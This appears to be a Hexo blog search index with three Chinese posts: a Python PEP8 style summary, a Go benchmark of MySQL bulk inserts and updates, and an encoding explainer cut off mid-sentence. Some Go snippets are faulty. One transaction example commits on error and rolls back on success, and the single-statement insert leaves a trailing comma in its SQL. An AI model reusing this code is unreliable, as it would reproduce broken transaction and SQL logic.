<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[Python编码风格]]></title>
      <url>%2F2017%2F06%2F24%2Fpython-style-pep8%2F</url>
      <content type="text"><![CDATA[最近做项目一直使用Golang, 距离上次使用Python已经半年之久了, 对于Go来说有fmt帮忙格式化, 解决了绝大部分编码风格问题, 而Python则需要自己注意,根据官方指导PEP8或者一些最佳实践比如Google Style来控制风格。时间久了 一些细节部分就忘记了, 于是翻阅之前写的博客, 受益良多, 于是打算把之前的这几篇博客迁移过来, 顺便更新, 方便以后查阅。 关于本文本文主要参考PEP8(Python版本标准库的编码约定),以及Google Style编码风格, 但却不会完全按照PEP8进行翻译, 我不会贴出不合规范的代码, 尽量简洁易懂, 方便快速阅读, 如果想看完整版本的PEP8相关文档, 请移步参考文档部分。 风格指南的目的风格指南的目的在于统一编码风格,让代码有规可循,这样人们就可以专注于”你在说什么”, 而不是”你在怎么说”.从而改善Python代码的可读性,即PEP 20所说的“可读性计数”(Readability counts). 风格指针在于统一风格, PEP8仅仅是官方指导, 本地编码风格同样重要, 如果满足可读性, 优先保持本地风格, 使得你整体项目的代码风格一致。 代码布局 每级缩进用4个空格(强烈建议使用4个空格作为缩进), 不要混用空格和Tab, Python3中不允许混合使用Tab和空格缩进 123def get_version(version=None): "Returns a PEP 386-compliant version number from VERSION." version = get_complete_version(version) 括号中使用垂直隐式缩进或使用悬挂缩进（对准左括号） 12foo = long_function_name(var_one, var_two, var_three, var_four) if语句跨行时，两个字符关键字(比如if)加上一个空格，再加上左括号构成了很好的缩进。 1234# Add some extra indentation on the conditional continuation line.if (this_is_one_thing and that_is_another_thing): do_something() 右边括号也可以另起一行（右括号回退） 12345678my_list = [ 1, 2, 3, 4, 5, 6,]result = some_function_that_takes_arguments( 'a', 'b', 'c', 'd', 'e', 'f',) 最大行宽限制所有行的最大行宽为79字符。文本长块，比如文档字符串或注释，行长度应限制为72个字符。续行的首选方法是使用小括号、中括号和大括号反斜线仍可能在适当的时候。其次是反斜杠。123with open('/path/to/some/file/you/want/to/read') as file_1, \ open('/path/to/some/file/being/written', 'w') as file_2: file_2.write(file_1.read()) 空行 空二行: 顶级定义之间空两行, 比如函数或者类定义. 空一行: 方法定义, 类定义与第一个方法之间, 都应该空一行. 函数或方法中, 某些地方要是你觉得合适, 就空一行.12345678910111213141516171819202122232425class StreamingHttpResponse(HttpResponseBase): """ A streaming HTTP response class with an iterator as content. This should only be iterated once, when the response is streamed to the client. However, it can be appended to or replaced with a new iterator that wraps the original content (or yields entirely new content). """ streaming = True def __init__(self, streaming_content=(), *args, **kwargs): super(StreamingHttpResponse, self).__init__(*args, **kwargs) # `streaming_content` should be an iterable of bytestrings. # See the `streaming_content` property methods. self.streaming_content = streaming_content @property def content(self): raise AttributeError("This %s instance has no `content` attribute. " "Use `streaming_content` instead." % self.__class__.__name__) @property def streaming_content(self): return map(self.make_bytes, self._iterator) 模块导入 导入在单独成行, 同一个模块的多个对象被导出时使用() 导入始终在文件的顶部，在模块注释和文档字符串之后，在模块全局变量和常量之前。 推荐绝对路径导入，因为它们通常更可读，而且往往是表现更好的（或至少提供更好的错误消息。 禁止使用通配符导入。 导入顺序如下：标准库进口,相关的第三方库，本地库。各组的导入之间要有空行。123456789101112131415161718192021222324252627282930313233# 标准库import asyncioimport osimport tracebackfrom functools import partialfrom inspect import isawaitablefrom multiprocessing import Processfrom signal import ( SIGTERM, SIGINT, signal as signal_func, Signals)from socket import ( socket, SOL_SOCKET, SO_REUSEADDR,)from time import time# 第三方库from httptools import HttpRequestParserfrom httptools.parser.errors import HttpParserErrortry: import uvloop as async_loopexcept ImportError: async_loop = asyncio# 本地库from sanic.log import log, netlogfrom sanic.response import HTTPResponsefrom sanic.request import Requestfrom sanic.exceptions import ( RequestTimeout, PayloadTooLarge, InvalidUsage, ServerError) 字符串引用Python中单引号字符串和双引号字符串都是相同的。注意尽量避免在字符串中的反斜杠以提高可读性。比如一段字符串里面既有单引号，又有双引号，就的使用 多行字符串的方式，避免使用 \” 或\’1error = """My Class hasn't "test" attribute.""" 表达式和语句中的空格12345678910111213141516171819202122# 括号里边避免空格 spam(ham[1], &#123;eggs: 2&#125;)# 逗号，冒号，分号之前避免空格if x == 4: print x, y; x, y = y, x# 索引操作符不留空格ham[1:9:3]# 函数调用的左括号之前不能有空格spam(1)# 二元操作符两边留一个空格,涉及 =、符合操作符 ( += , -=等)、比较( == , &lt; , &gt; , != , &lt;&gt; , &lt;= , &gt;= , in , not in , is , is not )、布尔( and , or , not )x = 1# 搞优先级运算符前后不留空格hypot2 = x*x + y*yc = (a+b) * (a-b)# 关键字参数和默认值参数的前后不要加空格def complex(real, imag=0.0): return magic(r=real, i=imag)# 函数注释中，=前后要有空格，冒号和"-&gt;"的前面无空格，后面有空格。def munge(sep: AnyStr = None):def munge() -&gt; AnyStr:# 尽量不使用复合语句(Compound statements: 多条语句写在同一行)if foo == 'blah': do_blah_thing() 普通注释通用规则: 与代码自相矛盾的注释比没注释更差。修改代码时要优先更新注释！ 注释是完整的句子。如果注释是断句，首字母应该大写，除非它是小写字母开头的标识符(永远不要修改标识符的大小写)。 如果注释很短，可以省略末尾的句号。注释块通常由一个或多个段落组成。段落由完整的句子构成且每个句子应该以点号(后面要有两个空格)结束，并注意断词和空格。 非英语国家的程序员请用英语书写你的注释，除非你200%确信代码永远不会被不懂你的语言的人阅读。 注释块: 注释块通常应用在代码前，并和这些代码有同样的缩进。每行以 ‘# ‘(除非它是注释内的缩进文本，注意#后面有空格)。 注释块内的段落用仅包含单个 ‘#’ 的行分割。 行内注释: 慎用行内注释(Inline Comments) 节俭使用行内注释。 行内注释是和语句在同一行，至少用两个空格和语句分开。行内注释不是必需的，重复罗嗦会使人分心。 123456# We use a weighted dictionary search to find out where i is in# the array. We extrapolate position based on the largest num# in the array and the array size and then do binary search to# get the exact number.if i &amp; (i-1) == 0: # true iff i is a power of 2 文档注释这部分很重要, 他是Python独有的, 为所有公共模块、函数、类和方法书写文档字符串。非公开方法不一定有文档字符串，建议有注释(出现在def行之后)来描述这个方法做什么, 详情参考PEP 257 文档字符串约定, 但是这部分我比较推崇Google Style风格。 文档字符串什么是文档字符串(Document String):文档字符串是包, 模块, 类或函数里的第一个语句. 这些字符串可以通过对象的__doc__成员被自动提取, 并且被pydoc所用. 文档字符串的格式:首先是一行以句号, 问号或惊叹号结尾的概述(或者该文档字符串单纯只有一行). 接着是一个空行. 接着是文档字符串剩下的部分,它应该与文档字符串的第一行的第一个引号对齐. 下面有更多文档字符串的格式化规范. 模块文档模块说明: 对这个模块进行概貌性的描述, 比如Json库的说明1234567891011121314151617181920212223242526r"""JSON (JavaScript Object Notation) &lt;http://json.org&gt; is a subset ofJavaScript syntax (ECMA-262 3rd edition) used as a lightweight datainterchange format.:mod:`json` exposes an API familiar to users of the standard library:mod:`marshal` and :mod:`pickle` modules. It is the externally maintainedversion of the :mod:`json` library contained in Python 2.6, but maintainscompatibility with Python 2.4 and Python 2.5 and (currently) hassignificant performance advantages, even without using the optional Cextension for speedups.Compact encoding:: &gt;&gt;&gt; import json &gt;&gt;&gt; json.dumps([1,2,3,&#123;'4': 5, '6': 7&#125;], sort_keys=True, separators=(',',':')) '[1,2,3,&#123;"4":5,"6":7&#125;]'Using json.tool from the shell to validate and pretty-print:: $ echo '&#123;"json":"obj"&#125;' | python -m json.tool &#123; "json": "obj" &#125; $ echo '&#123; 1.2:3.4&#125;' | python -m json.tool Expecting property name enclosed in double quotes: line 1 column 3 (char 2)""" 函数和方法文档这里说的函数,包括函数, 方法, 以及生成器。 一个函数必须要有文档字符串, 除非它满足以下条件: 外部不可见 非常短小 简单明了 文档字符串应该提供足够的信息, 当别人编写代码调用该函数时, 他不需要看一行代码, 只要看文档字符串就可以了.因此需要描述清楚以下几点: 函数参数: Args列出每个参数的名字, 并在名字后使用一个冒号和一个空格, 分隔对该参数的描述.如果描述太长超过了单行80字符,使用2或者4个空格的悬挂缩进(与文件其他部分保持一致). 描述应该包括所需的类型和含义. 如果一个函数接受foo(可变长度参数列表)或者**bar (任意关键字参数), 应该详细列出foo和**bar. 正常返回: Returns/Yields描述返回值的类型和语义. 如果函数返回None, 这一部分可以省略. 异常返回: Raises:列出与接口有关的所有异常. 123456789101112131415161718192021222324252627282930def fetch_bigtable_rows(big_table, keys, other_silly_variable=None): """Fetches rows from a Bigtable. Retrieves rows pertaining to the given keys from the Table instance represented by big_table. Silly things may happen if other_silly_variable is not None. Args: big_table: An open Bigtable Table instance. keys: A sequence of strings representing the key of each table row to fetch. other_silly_variable: Another optional variable, that has a much longer name than the other args, and which does nothing. Returns: A dict mapping keys to the corresponding table row data fetched. Each row is represented as a tuple of strings. For example: &#123;'Serak': ('Rigel VII', 'Preparer'), 'Zim': ('Irk', 'Invader'), 'Lrrr': ('Omicron Persei 8', 'Emperor')&#125; If a key from the keys argument is missing from the dictionary, then that row was not found in the table. Raises: IOError: An error occurred accessing the bigtable.Table object. """ pass 类文档同理类也需要做详尽的描述: 该类的目的, 以及概貌描述 类有公共属性(Attributes), 需要描述其意义 注意事项 继承object, 因为object实现了一些内置方法,方便兼容。 123456789101112131415161718class SampleClass(object): """Summary of class here. Longer class information.... Longer class information.... Attributes: likes_spam: A boolean indicating if we like SPAM or not. eggs: An integer count of the eggs we have laid. """ def __init__(self, likes_spam=False): """Inits SampleClass with blah.""" self.likes_spam = likes_spam self.eggs = 0 def public_method(self): """Performs operation blah.""" TODO注释如果类或者方法，函数 没有实现完整功能, 请使用TODO标记, 很多IDE都能找到这个标记, 方便以后改进, 别留坑.12# TODO(kl@gmail.com): Use a "*" here for string repetition.# TODO(Zeke) Change this to use relations. 访问控制合理的访问控制会使得代码更加健壮 __slots__: 控制对象可以绑定的属性, 避免对象被临时添加属性，造成对象的不可预期行为。 @property: 通过属性装饰器控制属性的读和写的行为, 防止不符合规范数据的录入。 __或者_: 使用下划线开头的变量，为私有变量(只是别名了, 你真想访问还是有办法的, 但是请不要这样做)。 __all__: 对于from import来说, 导出指定对象, 防止导出全局变量。 注意: 对暴露出去的共有变量请慎重, 因为如果你暴露出去过会, 下次在调整就需要考虑到兼容性了, 所以优先使用私有变量(__或者_)。 123456789101112131415class Student(object): __slots__ = ['birth', 'age'] @property def birth(self): return self._birth @birth.setter def birth(self, value): self._birth = value @property def age(self): return 2015 - self._birth 命名约定Python库的命名约定有点混乱，不可能完全一致。但依然有些普遍推荐的命名规范的。新的模块和包 (包括第三方的框架) 应该遵循这些标准。对不同风格的已有的库，建议保持内部的一致性。 包和模块名: 模块名要简短，全部用小写字母，可使用下划线以提高可读性。包名和模块名类似，但不推荐使用下划线 类名: 遵循CapWord。 函数和方法的参数: 实例方法第一个参数是 ‘self’。类方法第一个参数是 ‘cls’。如果函数的参数名与保留关键字冲突，通常在参数名后加一个下划线。 方法名和实例变量: 同函数命名规则。 非公开方法和实例变量增加一个前置下划线。 为避免与子类命名冲突，采用两个前置下划线来触发重整。类Foo属性名为__a， 不能以 Foo.__a访问。(执著的用户还是可以通过Foo._Foo__a。) 通常双前置下划线仅被用来避免与基类的属性发生命名冲突。 函数名: 函数名应该为小写，必要时可用下划线分隔单词以增加可读性。 mixedCase(混合大小写)仅被允许用于兼容性考虑(如: threading.py)。 异常名: 如果确实是错误，需要在类名添加后缀 “Error”。 全局变量名: 变量尽量只用于模块内部，约定类似函数。 对设计为通过 “from M import ” 来使用的模块，应采用__all__机制来防止导入全局变量；或者为全局变量加一个前置下划线。 常量: 常量通常在模块级定义,由大写字母用下划线分隔组成。比如括MAX_OVERFLOW和TOTAL。 合理的设计接口设计考虑类的方法和实例变量(统称为属性)是否公开。如果有疑问，选择不公开；把其改为公开比把公开属性改为非公开要容易。公开属性可供所有人使用，并通常向后兼容。非公开属性不给第三方使用、可变甚至被移除。这里不使用术语”private”， Python中没有属性是真正私有的。另一类属性是子类API(在其他语言中通常称为 “protected”)。 一些类被设计为基类，可以扩展和修改。 谨记这些Python指南： 公开属性应该没有前导下划线 如果公开属性名和保留关键字冲突，可以添加后置下划线 简单的公开数据属性，最好只公开属性名，没有复杂的访问/修改方法，python的Property提供了很好的封装方法。 如果不希望子类使用的属性，考虑用两个前置下划线(没有后置下划线)命名 任何向后兼容的保证只适用于公共接口。 文档化的接口通常是公共的，除非明说明是临时的或为内部接口、其他所有接口默认是内部的。 为了更好地支持内省，模块要在__all__属性列出公共API。 内部接口要有前置下划线。 如果命名空间(包、模块或类)是内部的，里面的接口也是内部的。 导入名称应视为实现细节。其他模块不能间接访名字，除非在模块的API文档中明确记载，如os.path中或包的__init__暴露了子模块。 函数设计当流程足够繁杂时，就要考虑函数，及如何将函数组合在一起。在Python中做函数设计，主要考虑到函数大小、聚合性、耦合性三个方面，这三者应该归结于规划与设计的范畴。高内聚、低耦合则是任何语言函数设计的总体原则。 如何将任务分解成更有针对性的函数从而导致了聚合性 如何设计函数间的通信则又涉及到耦合性 如何设计函数的大小用以加强其聚合性及降低其耦合性 聚合 完美的程序设计，每个函数应该而且只需做一件事 比如说:把大象放进冰箱分三步:把门打开、把大象放进去、把门关上。 这样就应该写三个函数而不是一个函数拿所有的事全做了。这样结构清晰，层次分明，也好理解！ 大小 Python代码以简单明了著称，一个过长或者有着深层嵌套的函数往往成为设计缺陷的征兆。 如果项目中设计的一个函数需要翻页才能看完的话，就要考虑将函数拆分了。 耦合 参数传入，return结果, 这样做可以让函数独立于它外部的东西。参数和return语句就是隔离外部依赖的最好的办法。 慎用全局变量, 全局变量通常是一种蹩脚的函数间的进行通信的方式。它会引发依赖关系和计时的问题，从而会导致程序调试和修改的困难。而且从代码及性能优化来考虑，本地变量远比全局变量快。 避免修改可变类型的参数（或者直接避免传入可变类型的参数，而使用args， 或者*kwargs 收集）Python数据类型比如说列表、字典属于可变对象。在作为参数传递给函数时，有时会像全局变量一样被修改。这样做的坏处是：增强了函数之间的耦合性，从而导致函数过于特殊和不友好。维护起来也困难。这个时候就要考虑使用切片S[:]和copy模块中的copy()函数和deepcopy()函数来做个拷贝，避免修改可变对象 参考文档 PEP8官方文档 PEP8中文翻译 Google Python风格指南]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[MySQL批量更新与插入]]></title>
      <url>%2F2017%2F06%2F19%2Fmysql-performance-for-bulk-action%2F</url>
      <content type="text"><![CDATA[最近一直使用gorm来操作数据库, 但当遇到一些批量操作时,感觉性能很差, 原因很简单, gorm是一条一条的执行的,效率很低, 所以对于批量操作, 特别是对于大量record需要创建或者修改时, 直接使用SQL, 才是正确的选择。 调整MySQL配置(MariaDB10) bulk_insert_buffer_size: 调整批量插入缓冲， 默认是16M, 为了能支持更大数据的批量插入, 按需调整, 我这里调整到128M net_buffer_length: 客户发出的SQL语句期望的长度, 默认是16K。如果语句超过这个长度，缓冲区自动地被扩大，直到max_allowed_packet个字节, 我调整到128K max_allowed_packet: 一个包的最大尺寸, 默认也是16M。消息缓冲区被初始化为net_buffer_length字节，但是可在需要时增加到max_allowed_packet个字节, 我也调整到128M 将这些配置写入MySQL的配置文件中123bulk_insert_buffer_size = 128Mnet_buffer_length = 128Kmax_allowed_packet = 128M 从启MySQL查看这些全局变量是否生效12345678910111213141516171819202122232425262728293031Welcome to the MariaDB monitor. Commands end with ; or \g.Your MariaDB connection id is 142Server version: 10.1.21-MariaDB-1~jessie mariadb.org binary distributionCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.MariaDB [(none)]&gt; show variables like "bulk_insert_buffer_size";+-------------------------+----------+| Variable_name | Value |+-------------------------+----------+| bulk_insert_buffer_size | 16777216 |+-------------------------+----------+1 row in set (0.00 sec)MariaDB [(none)]&gt; show variables like "net_buffer_length";+-------------------+-------+| Variable_name | Value |+-------------------+-------+| net_buffer_length | 16384 |+-------------------+-------+1 row in set (0.00 sec)MariaDB [(none)]&gt; show variables like "max_allowed_packet";+--------------------+----------+| Variable_name | Value |+--------------------+----------+| max_allowed_packet | 16777216 |+--------------------+----------+1 row in set (0.00 sec) 使用事务批量创建和修改多条记录时, 如果使用了多条语句, 请一定使用事物, 因为这些动作是一个事物, 避免部分成功,部分失败 造成数据不一致的问题。12345678tx,_ := db.Begin() stm,_ := Tx.Preapare("insert into test values(?,null)") result,err := stm.Exec('123')if err != nil &#123; tx.Commit()&#125; else &#123; tx.Rollback()&#125; 批量插入批量插入的方法一般包含: 直接循环提供(非常不推荐) 基于事物的循环提交 利用INSERT INTO的多值插入语句 这里以插入10000条数据为例进行测试, 关于下面的测试代码见: 测试代码完整示例 直接循环提交123456789101112131415// 使用For循环执行func forInsert() &#123; start := time.Now() stmt, err := db.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) for i := 0; i &lt; 10000; i++ &#123; name := "tony" + strconv.Itoa(i) _, err := stmt.Exec(name, i, 1) checkErr(err) &#125; delta := time.Now().Sub(start).String() fmt.Println("For Insert Total Time: ", delta)&#125; 基于事物循环提交12345678910111213141516171819202122232425262728// 在一个事物内循环执行func withTxInsert() &#123; start := time.Now() tx, err := db.Begin() checkErr(err) stmt, err := tx.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) for i := 0; i &lt; 10000; i++ &#123; name := "tony" + strconv.Itoa(i) _, err := stmt.Exec(name, i, 1) checkErr(err) &#125; if err != nil &#123; err := tx.Rollback() checkErr(err) return &#125; err = tx.Commit() checkErr(err) delta := time.Now().Sub(start).String() fmt.Println("Bulk With Transaction Insert Total Time: ", delta)&#125; 构造成一条语句提交SQL样例: “INSERT INTO table (field1,field2,field3) VALUES (‘a’,’b’,’c’), (‘a’,’b’,’c’),(‘a’,’b’,’c’);”12345678910111213141516171819202122232425262728// 构造一条Insert语句批量提交func bulkoneInsert() &#123; start := time.Now() sql := "INSERT INTO `user` (`user_name`,`user_age`,`user_sex`) VALUES " for i := 0; i &lt; 10000; i++ &#123; name := "tony" + strconv.Itoa(i) if i &lt; 10000 &#123; sql += fmt.Sprintf("('%s','%d','%d'),", name, i, 1) &#125; else &#123; sql += fmt.Sprintf("('%s','%d','%d');", name, i, 1) &#125; &#125; // fmt.Println(sql) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk One Insert Total Time: ", delta)&#125; 总结最对3种状况的插入时间排名: Ranking Function Name Time 1 bulkoneInsert 283.548003ms 2 withTxInsert 4.047390845s 3 forInsert 1m55.580310398s 结论很明显: 构造一条SQL插入效率高很多 批量更新我们可以使用多个UPDATE语句批量提交, 同时MySQL也支持一个SQL语句批量更新多条记录, 标准的SQL是使用UPDATE WHEN来实现, 除此之外 他的SQL扩展还支持INSERT INTO 和REPLACE INTO用于record的批量更新, 但是最好别用REPLACE INTO, 因为他是先删除再新增, 因此本质上它不是更新操作, 因为删除后, 更新时缺少某些字段的话, 会导致数据丢失, 这在业务上是绝对不允许的, 请谨慎使用 REPLACE INTO。而INSERT INTO则不会这样。 最后使用临时表也能进行批量更新(先更新临时表，然后从临时表中update),效率也相当不错,但是需要用户有temporary表的create权限, 因此使用也受限。我一般会使用INSERT INTO来构造批量更新的SQL, 因为该语法方便构造, 下面会对各种操作做简单的性能对比。 这里以更新10000条数据为例进行测试(基于上面插入的数据), 关于下面的测试代码见: 测试代码完整示例 循环更新1234567891011121314151617181920212223242526272829// 循环更新// UPDATE table SET column1=?,column2=? WHERE column=?func withTxUpdate() &#123; start := time.Now() tx, err := db.Begin() checkErr(err) stmt, err := tx.Prepare("UPDATE `user` SET `user_name`=? WHERE `user_id`=?;") checkErr(err) for i := 0; i &lt; 10000; i++ &#123; name := "forupdate" + strconv.Itoa(i) _, err := stmt.Exec(name, i+1) checkErr(err) &#125; if err != nil &#123; err := tx.Rollback() checkErr(err) return &#125; err = tx.Commit() checkErr(err) delta := time.Now().Sub(start).String() fmt.Println("Bulk With Transaction Update Total Time: ", delta)&#125; 标准的UPDATE语句批量更新12345678910111213141516171819202122232425262728293031323334353637383940414243// 标准Update语句更新// UPDATE categories// SET dingdan = CASE id// WHEN 1 THEN 3// WHEN 2 THEN 4// WHEN 3 THEN 5// END,// title = CASE id// WHEN 1 THEN 'New Title 1'// WHEN 2 THEN 'New Title 2'// WHEN 3 THEN 'New Title 3'// END// WHERE id IN (1,2,3)func bulkStandardUpdate() &#123; start := time.Now() core := "" where := "" for i := 0; i &lt; 10000; i++ &#123; name := "standardupdate" + strconv.Itoa(i) core += fmt.Sprintf("WHEN '%d' THEN '%s' ", i+1, name) if i == 0 &#123; where += fmt.Sprintf("'%d'", i+1) &#125; else &#123; where += fmt.Sprintf(",'%d'", i+1) &#125; &#125; sql := fmt.Sprintf("UPDATE `user` SET `user_name`= CASE `user_id` %s END WHERE `user_id` IN (%s)", core, where) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk Standard Update Total Time: ", delta)&#125; SQL扩展(INSERT INTO … ON DUPLICATE KEY UPDATE)123456789101112131415161718192021222324252627282930// insert into语句更新// INSERT INTO test_tbl (id,dr) VALUES (1,'2'),(2,'3'),...(x,'y') ON DUPLICATE KEY UPDATE dr=values(dr);func bulkInsertIntoUpdate() &#123; start := time.Now() core := "" for i := 0; i &lt; 10000; i++ &#123; name := "insertintoupdate" + strconv.Itoa(i) if i == 0 &#123; core += fmt.Sprintf("('%d', '%s')", i+1, name) &#125; else &#123; core += fmt.Sprintf(",('%d', '%s')", i+1, name) &#125; &#125; sql := fmt.Sprintf("INSERT INTO `user` (`user_id`, `user_name`) VALUES %s ON DUPLICATE KEY UPDATE `user_name`=values(`user_name`);", core) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk Insert Into Update Total Time: ", delta)&#125; SQL扩展(REPLACE INTO)123456789101112131415161718192021222324252627282930// replace inot语句更新// REPLACE INTO test_tbl (id,dr) VALUES (1,'2'),(2,'3'),...(x,'y');func bulkReplaceIntoUpdate() &#123; start := time.Now() core := "" for i := 0; i &lt; 10000; i++ &#123; name := "replaceintoupdate" + strconv.Itoa(i) if i == 0 &#123; core += fmt.Sprintf("('%d', '%s')", i+1, name) &#125; else &#123; core += fmt.Sprintf(",('%d', '%s')", i+1, name) &#125; &#125; sql := fmt.Sprintf("REPLACE INTO `user` (`user_id`, `user_name`) VALUES %s;", core) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk Replace Into Update Total Time: ", delta)&#125; 总结最对4种状况的插入时间排名: Ranking Function Name Time 1 bulkInsertIntoUpdate 462.575115ms 2 bulkReplaceIntoUpdate 564.974107ms 3 bulkStandardUpdate 3.160858907s 4 withTxUpdate 3.998437161s 结论很明显: InsertInto更新效率高很多]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[编码知识与常见乱码问题的解决办法]]></title>
      <url>%2F2017%2F05%2F14%2Funicode-war%2F</url>
      <content type="text"><![CDATA[有一个即使在经验丰富的程序员中也非常常见的误解就是，纯文本使用ASCII码并且每个字符都是8bits。事实上并不存在这样的纯文本 ，如果在内存或者是硬盘上面有一个你不知道编码的字符串，那么你将无法翻译或者显示它 ，这绝对没有第二条路可选。 数据的本质: 二进制CPU能识别的数据: CPU是利用数字电路设计出来的,所以仅能识别二进制的数据。磁盘能识别的数据： 磁盘上有很多磁性的点，而这些点 有2种状态，所以任何数据 仅能转换成2进程 ，及01 代码 才能利用磁盘的点的这种特性 来进行存储 ，所以任何存储在磁盘上的数据 都是二进制网络传输的数据：通过网络输出过来的数据，为高低电频，也对应二进制 但是为啥我们看到的数据都不是01代码喃, 比如数据： 一串二进制的bits：0100100001000101010011000100110001001111 为啥最后我们用文本工具打开后, 看到的是HELLO而不是01代码本身喃？那文本编辑器是怎么将二进制翻译成字符的喃？这里有2个关键的问题: 字节是怎样分组的？（例如1个字节表示一个字符还是2个字节表示一个字符） 一个或多个字节是怎么映射到字符上的? 这就是我们要说的编码需要解决的问题。 编码概念编码的核心是定义了如下2件事情: 字节是怎么分组的，如8 bits或16 bits一组，这也被称作编码单元。 编码单元和字符之间的映射关系。例如，在ASCII码中，十进制65映射到字母A上 编码之战混战年代很久以前，计算机制造商有自己的表示字符的方式。他们并不需要担心如何和其它计算机交流，并提出了各自的方式来将字形渲染到屏幕上。随着计算机越来越流行，厂商之间的竞争更加激烈，在不同的计算机体系间转换数据变得十分蛋疼，人们厌烦了这种自定义造成的混乱。 ASCII码的到来最终，计算机制造商一起制定了一个标准的方法来描述字符。他们定义使用一个字节的低7位来表示字符，并且制作了如上图所示的对照表来映射七个比特的值到一个字符上。例如，字母A是65，c是99，~是126等等， ASCII码就这样诞生了。原始的ASCII标准定义了从0到127 的字符，这样正好能用七个比特表示。不过好景不长。。。 ASCII码第八位 引起的战争为什么选择了7个比特而不是8个来表示一个字符呢？我并不关心。但是一个字节是8个比特，这意味着1个比特并没有被使用，也就是从128到255的编码并没有被制定ASCII标准的人所规定，这些美国人对世界的其它地方一无所知甚至完全不关心。其它国家的人趁这个机会开始使用128到255范围内的编码来表达自己语言中的字符。例如，144在阿拉伯人的ASCII码中是گ，而在俄罗斯的ASCII码中是ђ。即使在美国，对于未使用区域也有各种各样的利用。IBM PC就出现了“OEM 字体”或”扩展ASCII码”，为用户提供漂亮的图形文字来绘制文本框并支持一些欧洲字符，例如英镑（£）符号。再强调一遍，ASCII码的问题在于尽管所有人都在0-127号字符的使用上达成了一致，但对于128-255号字符却有很多很多不同的解释。你必须告诉计算机使用哪种风格的ASCII码才能正确显示128-255号的字符。这对于北美人和不列颠群岛的人来说不算什么问题，因为无论使用哪种风格的ASCII码，拉丁字母的显示都是一样的。英国人还需要面对的问题是原始的ASCII码中不包含英镑符号，但是这个已经无关紧要了。与此同时，在亚洲有更让人头疼的问题。亚洲语言有更多的字符和字形需要被存储，一个字节已经不够用了。所以他们开始使用两个字节来存储字符，这被称作DBCS（双字节编码方案）。在DBCS中，字符串操作变得很蛋疼，你应该怎么做str++或str–？这些问题成为了系统开发者的噩梦。例如，MS DOS必须支持所有风格的ASCII码，因为他们想把软件卖到其他国家去。他们提出了「内码表」这一概念。例如，你需要告诉DOS（通过使用”chcp”命令）你想使用保加利亚语的内码表，它才能显示保加利亚字母。内码表的更换会应用到整个系统。这对使用多种语言工作的人来说是一个问题，因为他们必须频繁的在几个内码表之间来回切换。尽管内码表是一个好主意，但是它不是一个简洁的解决方案，它只是一个hack技术或者说是简单的修正来让编码系统可以工作。 Unicode的世界最终，美国人意识到他们应该提出一种标准方案来展示世界上所有语言中的所有字符，以便缓解程序员的痛苦和避免字符编码引发的第三次世界大战。出于这个目的，Unicode诞生了。Unicode背后的想法非常简单，然而却被普遍的误解了。Unicode就像一个电话本，标记着字符和数字之间的映射关系。Joel称之为「神奇数字」，因为它们可能是随机指定的，而且不会给出任何解释。官方术语是码位(Code Point)，总是用U+开头。理论上每种语言中的每种字符都被Unicode协会指定了一个神奇数字。例如希伯来文中的第一个字母א，是U+2135，字母A是U+0061。Unicode并不涉及字符是怎么在字节中表示的，它仅仅指定了字符对应的数字，仅此而已。关于Unicode的其它误解包括：Unicode支持的字符上限是65536个，Unicode字符必须占两个字节。告诉你这些的人应该去换换脑子了。记住，Unicode只是一个用来映射字符和数字的标准。它对支持字符的数量没有限制，也不要求字符必须占两个、三个或者其它任意数量的字节。Unicode字符是怎样被编码成内存中的字节这是另外的话题，它是被UTF(Unicode Transformation Formats)定义的。 Unicode的实现两个最流行的Unicode编码方案是UTF-8和UTF-16。让我们看看它们的细节UTF-8是一个非常惊艳的概念，它漂亮的实现了对ASCII码的向后兼容，以保证Unicode可以被大众接受。发明它的人至少应该得个诺贝尔和平奖。在UTF-8中，0-127号的字符用1个字节来表示，使用和US-ASCII相同的编码。这意味着1980年代写的文档用UTF-8打开一点问题都没有。只有128号及以上的字符才用2个，3个或者4个字节来表示。因此，UTF-8被称作可变长度编码。0100100001000101010011000100110001001111这个字节流在ASCII和UTF-8中表示相同的字符：HELLO另一个流行的可变长度编码方案是UTF-16，它使用2个或者4个字节来存储字符。然而，人们逐渐意识到UTF-16可能会浪费存储空间，但那是另一个话题了。 编码排序低字节序(Little Endian)和高字节序(Big Endian)Endian读作End-ian或者Indian。这个术语的起源可以追溯到格列佛游记。（小说中，小人国为水煮蛋应该从大的一端（Big-End）剥开还是小的一端（Little-End）剥开而争论，争论的双方分别被称为“大端派”和“小端派”。）低字节序和高字节序只是一个关于在内存中存储和读取一段字节（被称作words）的约定。这意味着当你让计算机用UTF-16把字母A（占两个字节）存在内存中时，使用哪种字节序方案决定了你把第一个字节放在第二个字节的前面还是后面。这么说有点不太容易懂，让我们来看一个例子：当你使用UTF-16存下来自你朋友的附件时，在不同的系统中它的后半部分可能是这样的：00 68 00 65 00 6C 00 6C 00 6F（高字节序，高位字节被存在前面）68 00 65 00 6C 00 6C 00 6F 00（低字节序，低位字节被存在前面）字节序方案只是一个微处理器架构设计者的偏好问题，例如，Intel使用低字节序，Motorola使用高字节序。 字节顺序标记如果你经常要在高低字节序的系统间转换文档，并且希望区分字节序，还有一种奇怪的约定，被称作BOM。BOM是一个设计得很巧妙的字符，用来放在文档的开头告诉阅读器该文档的字节序。在UTF-16中，它是通过在第一个字节放置FE 